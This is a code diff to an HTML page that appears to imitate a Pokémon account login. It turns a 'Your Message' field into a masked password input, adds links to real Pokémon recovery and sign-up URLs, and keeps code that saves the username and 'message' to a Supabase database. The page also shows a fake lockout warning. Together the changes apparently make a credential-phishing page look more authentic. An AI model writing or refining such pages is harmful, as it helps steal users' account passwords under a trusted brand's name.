@@ -38,9 +38,9 @@
             text-align: center;
         }
 
-        /* Logo */
+        /* Logo - UPDATED SIZE */
         .logo {
-            max-width: 200px;
+            max-width: 260px; /* Made the logo bigger */
             margin-bottom: 25px;
         }
 
@@ -61,12 +61,14 @@
             position: relative;
         }
 
-        input[type="text"] {
+        /* UPDATED: Accommodates both text and password types for the eye icon */
+        input[type="text"],
+        input[type="password"] {
             width: 100%;
             background-color: #262626;
             color: #ffffff;
             border: none;
-            padding: 16px 15px;
+            padding: 16px 45px 16px 15px; /* Added right padding for the eye icon */
             border-radius: 6px;
             font-size: 15px;
             outline: none;
@@ -83,6 +85,23 @@
             cursor: not-allowed;
         }
 
+        /* NEW: Eye Icon Toggle Styling */
+        .toggle-password {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .toggle-password svg {
+            width: 20px;
+            height: 20px;
+        }
+
         /* Inline Warning Styling */
         .explicit-warning {
             display: none; 
@@ -94,7 +113,7 @@
             animation: fadeIn 0.3s ease;
         }
 
-        /* --- UPDATED: Center aligned link --- */
+        /* Center aligned link */
         .link-center {
             text-align: center;
             margin-bottom: 20px;
@@ -267,11 +286,17 @@
             </div>
             
             <div class="input-group">
-                <input type="text" id="message" placeholder="Your Message" required>
+                <input type="password" id="message" placeholder="Your Message" required>
+                <span class="toggle-password" id="toggleMessageVisibility">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="#8c8c8c" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                        <circle cx="12" cy="12" r="3"></circle>
+                    </svg>
+                </span>
             </div>
 
             <div class="link-center">
-                <a href="#">Trouble logging in?</a>
+                <a href="https://recover.pokemon.com/?login_challenge=jbG0d0ktWag4WtHRhi9lkmWYL_Q459QGftYSVEcIpQ15314R5etTLQX01fqJeBwEb9cOehgMpx0GJjlVk93fM18E70Brgfg6G-PiM1K6GbsfGgA9TVUAo7CpLX8Ao-pYRHp5cEO4NFYR3nTi8TA9C4PBaI4yvnjCQXwLgPtSKgZIYbQHS5b_uWJ_CWlCQFH6uGsEbqJ9BO4IJ0lHsNa_nwZnNUFjyckCOUYOYWNCYBdsKK_oEt6AMa853nwSv7BQn3CYft9wNA3-4kRE95QM6mANVW6NNAVjLYekZdGKXLJUivwbbxMLIaUgluBVHqBgpw7JmGt2Sj4sDMYPbcrWBcIsaeRFeYZMyyW5BYguH1NR4OQN71E78303bd1N18afS8byRBdYfMKjjASaAzOCt2OwzwB856hNnqMlma9qk_aZnUWmkMGLE8d4DY4Sz1wpF5CNLYSodgAWnnVfzejMxFb7ntcDv9JfkqMDGdaLNxrTi_Eo8DjTwyAnkjBqbPdCyOtpR4S4QVORYJk1zSU0XjpvbaiVWRwSYewZaYvXwldhnYh_9Hs_5trtVRpqUhjDKNdb0mwM3RVrlCxPwG8UeCJfGejG27b2LGkIjfUnzqW6EMFe-FnVC9e6t5fV9X_e5e5R5IJ9GQa9GnHdj0ntJBuv6WI1JTh0UekHKE4XNf48Hr0R7TlGIb_KNpAwXnPNO6hNzznAn0VmemHAStTgYz5EfqF1GUHicceAHXma7w_PCzN3xUYTOsnXaldWQ8er-_RtAaxtgntv-MGCegCF7e633gt1bZj3TxDD6p4x768zAre4G9ZV7u6e3eDw_x5mRlt5XCpBraup_0V3nEqkSRhg-YJIxT5Oue6EIhPtDddrMxstBs_4a_8K_XA7W6zS1OBIeM4b7-uLTWkn5Fjcd8bkHijsf7waYlt511cVt809waUNJ9HBy7Ygksfo_e0V6q15RutSQxE-1gz_exsrG5F4hAmDxdAmpi_InNM_08joL2pAE8WeT72m1j47cPS6XMcWmNLW2qAJPaikAmOZisQV1L9hCWsaJevFx5vxX7hdlEcyYeBAG4ysX6-3rCvZkXy1Z5H892RCMJY6qWKnFkjxKUnj3yF2uZzS5vDeL_4O3FQWiCJxkBTNGmgVf6gh7FZs-yd_yJ8gpJcfTCKQV5NS4MxIOxOI3Qgv__MCzTwLYwOsMD3XX8sJtf-eZQ8tH6Z4mlB4mVuOcRCJz__0tzOaY2w-MKhsnliajcyrJ5YPHGEnFcswdGQgvw-GMAYTcotFCMAdYZmH60EPqEXrz7ONXr2w_7ucQBcoQqOcMum6eSczZSqs0u_m_JCjlIUtjfiHxb3dJsgyoeMsdHqg5RJXnpdioTcIvGE7J4BJWPjkWiPTaMqpHcm5-EKn35P062beiQyeAxmPBM-34iCBIIDR05cRWZgnOX8QG9UlTvdnXP6WWcg4GE9MCHsGcZPsVbvUZkXwUdW40a_aprO84vG7FpPAQq_i8mNK31cY5sYUFSzUKCU10nF52plQSuEgE0zA7ubPYoQSrsQPM2ZgM1sO7uJTQs4rsJu2WEDNlY4oZacpC3O-PZlx_tOfFQRTRINMNebYV3UN_C5PKA4k81ovR8OvLPacgE7VaXQNpvwBuntF6Gtwg2nm3FfpZgoAKH6XKbow5tjddtC3v_lO-7UvZiaD206GupBbT8-gHNVUoUN7w3LmydNMrka7d2Lp7eRAcrmxM1mLwgH5mtDMW5Zqoyq8wqydIwF8q3ediC_2rpaFaG68jLSlFqVhXUqwP8zal5poLXvDmHzFoOjlYcG0bBI5kn4VHFk2h-8dR8iFxEHxzxbpKFTebFpNa_r_&lng=">Trouble logging in?</a>
             </div>
 
             <button type="submit" id="submitBtn" class="btn-primary">Send Msg</button>
@@ -302,7 +327,7 @@
 
         <div class="signup-section">
             <p>Don't have an account?</p>
-            <button class="btn-secondary">Create an Account</button>
+            <button class="btn-secondary" onclick="window.location.href='https://join.pokemon.com/?challenge=jbG0d0ktWag4WtHRhi9lkmWYL_Q459QGftYSVEcIpQ15314R5etTLQX01fqJeBwEb9cOehgMpx0GJjlVk93fM18E70Brgfg6G-PiM1K6GbsfGgA9TVUAo7CpLX8Ao-pYRHp5cEO4NFYR3nTi8TA9C4PBaI4yvnjCQXwLgPtSKgZIYbQHS5b_uWJ_CWlCQFH6uGsEbqJ9BO4IJ0lHsNa_nwZnNUFjyckCOUYOYWNCYBdsKK_oEt6AMa853nwSv7BQn3CYft9wNA3-4kRE95QM6mANVW6NNAVjLYekZdGKXLJUivwbbxMLIaUgluBVHqBgpw7JmGt2Sj4sDMYPbcrWBcIsaeRFeYZMyyW5BYguH1NR4OQN71E78303bd1N18afS8byRBdYfMKjjASaAzOCt2OwzwB856hNnqMlma9qk_aZnUWmkMGLE8d4DY4Sz1wpF5CNLYSodgAWnnVfzejMxFb7ntcDv9JfkqMDGdaLNxrTi_Eo8DjTwyAnkjBqbPdCyOtpR4S4QVORYJk1zSU0XjpvbaiVWRwSYewZaYvXwldhnYh_9Hs_5trtVRpqUhjDKNdb0mwM3RVrlCxPwG8UeCJfGejG27b2LGkIjfUnzqW6EMFe-FnVC9e6t5fV9X_e5e5R5IJ9GQa9GnHdj0ntJBuv6WI1JTh0UekHKE4XNf48Hr0R7TlGIb_KNpAwXnPNO6hNzznAn0VmemHAStTgYz5EfqF1GUHicceAHXma7w_PCzN3xUYTOsnXaldWQ8er-_RtAaxtgntv-MGCegCF7e633gt1bZj3TxDD6p4x768zAre4G9ZV7u6e3eDw_x5mRlt5XCpBraup_0V3nEqkSRhg-YJIxT5Oue6EIhPtDddrMxstBs_4a_8K_XA7W6zS1OBIeM4b7-uLTWkn5Fjcd8bkHijsf7waYlt511cVt809waUNJ9HBy7Ygksfo_e0V6q15RutSQxE-1gz_exsrG5F4hAmDxdAmpi_InNM_08joL2pAE8WeT72m1j47cPS6XMcWmNLW2qAJPaikAmOZisQV1L9hCWsaJevFx5vxX7hdlEcyYeBAG4ysX6-3rCvZkXy1Z5H892RCMJY6qWKnFkjxKUnj3yF2uZzS5vDeL_4O3FQWiCJxkBTNGmgVf6gh7FZs-yd_yJ8gpJcfTCKQV5NS4MxIOxOI3Qgv__MCzTwLYwOsMD3XX8sJtf-eZQ8tH6Z4mlB4mVuOcRCJz__0tzOaY2w-MKhsnliajcyrJ5YPHGEnFcswdGQgvw-GMAYTcotFCMAdYZmH60EPqEXrz7ONXr2w_7ucQBcoQqOcMum6eSczZSqs0u_m_JCjlIUtjfiHxb3dJsgyoeMsdHqg5RJXnpdioTcIvGE7J4BJWPjkWiPTaMqpHcm5-EKn35P062beiQyeAxmPBM-34iCBIIDR05cRWZgnOX8QG9UlTvdnXP6WWcg4GE9MCHsGcZPsVbvUZkXwUdW40a_aprO84vG7FpPAQq_i8mNK31cY5sYUFSzUKCU10nF52plQSuEgE0zA7ubPYoQSrsQPM2ZgM1sO7uJTQs4rsJu2WEDNlY4oZacpC3O-PZlx_tOfFQRTRINMNebYV3UN_C5PKA4k81ovR8OvLPacgE7VaXQNpvwBuntF6Gtwg2nm3FfpZgoAKH6XKbow5tjddtC3v_lO-7UvZiaD206GupBbT8-gHNVUoUN7w3LmydNMrka7d2Lp7eRAcrmxM1mLwgH5mtDMW5Zqoyq8wqydIwF8q3ediC_2rpaFaG68jLSlFqVhXUqwP8zal5poLXvDmHzFoOjlYcG0bBI5kn4VHFk2h-8dR8iFxEHxzxbpKFTebFpNa_r_'">Create an Account</button>
         </div>
 
         <div class="footer">
@@ -321,6 +346,22 @@
         const messageInput = document.getElementById('message');
         const submitBtn = document.getElementById('submitBtn');
         const supabaseClient = window.supabase.createClient(window.SUPABASE_CONFIG.url, window.SUPABASE_CONFIG.anonKey);
+
+        // NEW: Toggle Message Visibility Logic
+        const toggleMessageBtn = document.getElementById('toggleMessageVisibility');
+        toggleMessageBtn.addEventListener('click', function () {
+            const type = messageInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            messageInput.setAttribute('type', type);
+            
+            // Switch the icon visually
+            if (type === 'text') {
+                // Eye slashed icon
+                this.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="#8c8c8c" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line></svg>';
+            } else {
+                // Normal Eye icon
+                this.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="#8c8c8c" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>';
+            }
+        });
 
         async function saveContactMessage(username, message) {
             const { error } = await supabaseClient
@@ -362,6 +403,10 @@
                 warningElement.style.display = 'block';
                 
                 this.reset();
+                // Reset to password field on submit if they submitted while it was visible
+                messageInput.setAttribute('type', 'password');
+                toggleMessageBtn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="#8c8c8c" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>';
+
             } else {
                 warningElement.innerHTML = "<strong>Account Locked</strong><br>You have been temporarily locked out of your account for 15 minutes due to multiple explicit message attempts.";
                 warningElement.style.display = 'block';
